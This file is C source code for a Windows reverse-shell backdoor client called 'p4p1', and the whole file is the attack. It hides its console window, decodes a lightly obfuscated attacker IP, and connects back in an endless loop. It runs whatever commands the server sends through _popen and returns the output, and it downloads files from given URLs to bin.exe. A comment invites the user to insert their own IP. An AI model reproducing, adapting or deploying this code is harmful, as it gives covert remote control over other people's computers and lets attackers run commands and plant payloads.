#include "p4p1-h_win.h"

#define SERVER_IP "97/358/316/213" //edit this with your own ip + 1 char

/*
 * Main function
 */
int main(int argc, char * argv[])
{
	/* Activate stealth so that the program runs in
	 * background
	 */
	if(argc == 1)
		stealth();

	/*
	 * initialize main structure with all of the variables
	 */
	fileWrapper file;

	/*
	 * Main while loop
	 * for constant execution
	 */
	while(1){

		/*
		 * initialize all of the variables
		 */
		setupvar(&file);

		/*
		 * main function where the magic is :)
		 */
		main_loop(&file);
	}

	return 0;
}

int main_loop(fileWrapper * file)
{
	/* setup variables */
	int cn;							// connection indicator										//command pipe
	int bytesSent;                  			// number of bytes sent
	int bytesRecv;              				// number of bytes received
	char sessionID[5] = "";					// Session id given by server
	char buf[BUFSIZE] = "";					// buf

	bytesSent = 0;
	bytesRecv = SOCKET_ERROR;

	/* create pointers so that the synthacts gets faster*/
	int * pbs = &bytesSent;
	int * pbr = &bytesRecv;

	/* connection
 	 * to the main server
	 */
	connected(file, &cn);

	/* receive session ID */
	if(cn != SOCKET_ERROR){

		*pbr = SOCKET_ERROR;					// setup var to recv full session id
		sessionID[0] = wrecvsid(file->s, BUFSIZE, pbr);		// receuve the session id
									// and declare it to the var

		/* Send a small user interface if the session id is not 5 aka
		 * not the default server
		 */
		if(sendui(file->s, sessionID[0], pbs) != 5){
			goto close;					// an error ocured restart the app
		}

	}
	/*
	 *End of session id blocks
	 **/

	/*
	 * While connected loop
	 **/
	while(cn != SOCKET_ERROR){

		/*
		 * Send Prompt if no session ID aka using netcat
		 **/
		if(sendprompt(file->s, sessionID[0]) < 0){
			 goto close;				// error restart app
		}

		memset(file->buf, 0, BUFSIZE);			// Reset the buffer

		/*
		 * While loop to process the reseived data
		 */
		*pbr = SOCKET_ERROR;
		while(*pbr == SOCKET_ERROR){

			/*
			 * Actual recv func to recv data sent by user
			 */
			*pbr = recv(file->s, file->buf, BUFSIZE, 0);
			if(*pbr == 0 || *pbr == WSAECONNRESET){
				break;
			}

			if(bytesRecv < 0){
				return -1;
			} else {
				/*
				 * process received data to detremine if a special command or not
				 */
				int q = processdata(file->s, file->buf[0], file->buf[1]);
				if(q < 0){

					goto close;

				} else if(q == 1) {

					/*
					 * reset buf on special command executed
					 */
					memset(file->buf, 0, BUFSIZE);

				} else{

					/*
					 * Execute the commad if its not a special one
					 */
					if (executeCommand(file) > 0){
						goto close;
					}

				}
			}
		}



	}
	/*
	 * end of While connected loop
	 **/
	close:
	_pclose(file->pPipe);
	WSACleanup();
	Sleep(5000);	//5 sec cooldown so that when it quits the server it doesnt flip out.
}

int setupvar(fileWrapper * file)
{
	int portno;     //number of port
	char ip[16];
	char ipchar[16];
	char portchar[6];   //Char retrieved from .cfg file
	FILE * fp = fopen("port.cfg", "r"); //Open up the cfg file
	FILE * fip = fopen("ip.cfg", "r");

	if(fp == NULL){
		file->portno = 4441;      //If no file set up default port to prevent errors
	} else {
		int i = 0;
		char c;
		while( (c = fgetc(fp)) != EOF){     // Get char from file while not at EOF
			portchar[i] = c;
			i++;
		}
		portchar[i+1] = '\0';               //Terminate string

		file->portno = atoi(portchar);            //Set up custom port
		fclose(fp);
	}

	if(fip == NULL){
		char ipjib[14] = SERVER_IP;
		char corip[15];

		int i;

		for(i = 0; i < strlen(ipjib); i++){
			char ch;
			ch = ipjib[i];
			corip[i] = decr(ch);
		}
		corip[14] = '\0';

		strcpy(file->ip, corip);

	} else {
		int i = 0;
		char c;
		while( (c = fgetc(fip)) != EOF){     // Get char from file while not at EOF
			ipchar[i] = c;
			i++;
		}
		ipchar[i-1] = '\0';

		strcpy(file->ip, ipchar);

		fclose(fip);
	}

	//startup sa
	if(WSAStartup(MAKEWORD(2, 2), &file->wsa) != NO_ERROR){
		exit(1);
	}

	/* initialize socket */
	file->s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(file->s == INVALID_SOCKET){
		exit(1);
	}

	file->client.sin_family = AF_INET;
	file->client.sin_port = htons(file->portno);
	file->client.sin_addr.s_addr = inet_addr(file->ip);	//this should not be hard coded.

}

void connected(fileWrapper * file, int * cn)
{
	do {
		*cn = connect(file->s, (SOCKADDR*) &file->client, sizeof(file->client));
	} while( *cn == SOCKET_ERROR);
}

int processdata(SOCKET s, char cmd, char cmd2)
{
	char buf[BUFSIZE] = "";
	int bytesSent = 0;
	int bytesRecv = 0;

	int * pbs = &bytesSent;
	int * pbr = &bytesRecv;

	if(iscommand(cmd) == 1 || iscommand(cmd) == 2 || iscommand(cmd) == 3){

		if(iscommand(cmd) == 3 && iscommand(cmd2) == 4){

			memset(buf, 0, BUFSIZE);
			strcpy(buf, "#!cd >");

			*pbs = send(s, buf, BUFSIZE, 0);
			if(*pbs == SOCKET_ERROR) {
				if(WSAGetLastError() != WSAECONNREFUSED
				|| WSAGetLastError() == WSAECONNRESET){
					return -2;
				} else {
					return -1;
				}
			}

			memset(buf, 0, BUFSIZE);
			*pbr = SOCKET_ERROR;
			while(*pbr == SOCKET_ERROR){
				*pbr = recv(s, buf, BUFSIZE, 0);
				if(*pbr == 0 || *pbr == WSAECONNRESET){
					return -2;
				}

				if(*pbr < 0){
					return -1;
				} else {
					int q = 0;
					while(buf[q] != '\n'){
						q++;
					}
					buf[q] = '\0';
					buf[q+1] = 0;
					change_dir(buf);
					memset(buf, 0, BUFSIZE);
					strcpy(buf, "[*] changed dir\n");
				}
			}
			if(sendbuf(s, buf, BUFSIZE) > 0){
       			 return -1;
       		 	}
			return 1;

		}else if(iscommand(cmd) == 2){	// exit command
			memset(buf, 0, BUFSIZE);
			return -1;
		} else if (iscommand(cmd) == 1) { //file download command
			memset(buf, 0, BUFSIZE);
			strcpy(buf, "#!url >");

			*pbs = send(s, buf, BUFSIZE, 0);
			if(*pbs == SOCKET_ERROR) {
				if(WSAGetLastError() != WSAECONNREFUSED
				|| WSAGetLastError() == WSAECONNRESET){
					return -2;
				} else {
					return -1;
				}
			}

			memset(buf, 0, BUFSIZE);
			*pbr = SOCKET_ERROR;
			while(*pbr == SOCKET_ERROR){
				*pbr = recv(s, buf, BUFSIZE, 0);
				if(*pbr == 0 || *pbr == WSAECONNRESET){
					return -2;
				}

				if(*pbr < 0){
					return -1;
				} else {
					download(buf);
					memset(buf, 0, BUFSIZE);
					strcpy(buf, "[*] file downloaded\n");
				}
			}
			if(sendbuf(s, buf, BUFSIZE) > 0){
       			 return -1;
       		 	}
			return 1;
		} else {
			return -2;
		}

		/*
		 * Send back output
		 **/
		 if(sendbuf(s, buf, BUFSIZE) > 0){
			 return -1;
		 }

	} else {

		return 4;

	}

	return 0;
}

/*
 * get buf and check if p4p1 custom command
 */
int iscommand(char buf)
{
	if(buf == '*') {
		return 1;
	} else if(buf == '&') {
		return 2;
	} else if(buf == 'c') {
		return 3;
	} else if(buf == 'd') {
		return 4;
	} else {
		return 0;
	}
}

void change_dir(char * dir)
{
	chdir(dir);
}

/*Downloader func
 */

int download(char * url)
{
	char path[100] = "bin.exe";
	int r = 1;
	HMODULE hDll;
	UDTF URLDownloadToFile;


	if((hDll = LoadLibrary("urlmon"))) {
		if((URLDownloadToFile = (UDTF)GetProcAddress(hDll, "URLDownloadToFileA"))) {
			if(URLDownloadToFile(0, url, path, 0, 0) == 0)
				r = 0;
	}
		FreeLibrary(hDll);
	}

	return r;
}

/*
 * wrapper for recv the sessionid
 **/
char wrecvsid(int sock, int size, int *br)
{
	int pbr = *(int *)br;
	char buf[size];
	pbr = SOCKET_ERROR;
	while(pbr == SOCKET_ERROR){
		pbr = recv(sock, buf, size, 0);
			if(pbr == 0 || pbr == WSAECONNRESET){
				break;
			}

			if(pbr < 0){
				return -1;
			} else {
				return buf[0];
			}
	}

}

/*
 * Wrapper to send prompt
 */
int sendui(int s, char uin, int * bs)
{
	int pbs = *(int *)bs;
	char ui[95] = "       _ _       _\n  _ __| | | _ __/ |\n | '_ \\_  _| '_ \\ |\n | .__/ |_|| .__/_|\n |_|       |_|\n\0";
	char uivpn[146] = "      _ _       _\n _ __| | | _ __/ |_ ___ __ _ _\n| '_ \\_  _| '_ \\ \\ \\V / '_ \\ ' \\\n| .__/ |_|| .__/_|\\\\_/| .__/_||_|\n|_|       |_|        |_|    \n\0";

	if(uin == '0'){
		pbs = send(s, ui, sizeof(ui), 0);
	        if(pbs == SOCKET_ERROR) { //server disconnected!
	        	if(WSAGetLastError() != WSAECONNREFUSED
	                || WSAGetLastError() == WSAECONNRESET){
	                	return 1;
	                } else {
	       	                return 1;
	                }
		}
	}

	if(uin == '1'){
		pbs = send(s, uivpn, sizeof(uivpn), 0);
                if(pbs == SOCKET_ERROR) { //server disconnected!
                        if(WSAGetLastError() != WSAECONNREFUSED
                        || WSAGetLastError() == WSAECONNRESET){
                                return 1;
                        } else {
                                return 1;
                        }
                }
	}


	return 0;
}

void stealth()
{
	HWND stealth;
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

int sendbuf(SOCKET s, char * buf, int size){
	int bytesSent;
	int * pbs;

	bytesSent = 0;
	pbs = &bytesSent;

	*pbs = send(s, buf, size, 0);
	if(*pbs == SOCKET_ERROR) {
		if(WSAGetLastError() != WSAECONNREFUSED
		|| WSAGetLastError() == WSAECONNRESET){
			return 1;
		} else {
			return 2;
		}
	}

	return 0;
}

int sendprompt(SOCKET s, char uin)
{
	int bytesSent;
	int * pbs;
	char prompt[10] = "\n<p4p1 />";

	bytesSent = 0;
	pbs = &bytesSent;

	if(uin == '0'){
		*pbs = send(s, prompt, sizeof(prompt), 0);
		if(*pbs == SOCKET_ERROR) { //server disconnected!
			if(WSAGetLastError() != WSAECONNREFUSED
			|| WSAGetLastError() == WSAECONNRESET){
				return 2;
			} else {
				return 1;
			}
		}
	}

	return 0;
}

int executeCommand(fileWrapper * file)
{
	if( (file->pPipe = _popen( file->buf, "r" )) == NULL ){

		memset(file->buf, 0, BUFSIZE);
		strcpy(file->buf, "error in command");

	} else {

		memset(file->buf, 0, BUFSIZE);
		int i = 0;
		char ch;
		while((ch = fgetc(file->pPipe)) != EOF){
			file->buf[i] = ch;
			i++;
		}

	}

	/*
	 * Send back output
	 **/
	 if(sendbuf(file->s, file->buf, BUFSIZE) > 0){
		 return 1;
	 }

}

/*
 *Verry simple crypo to hide some stuff
 **/
char incr(char ch)
{
	return ch+1;
}

char decr(char ch)
{
	return ch-1;
}
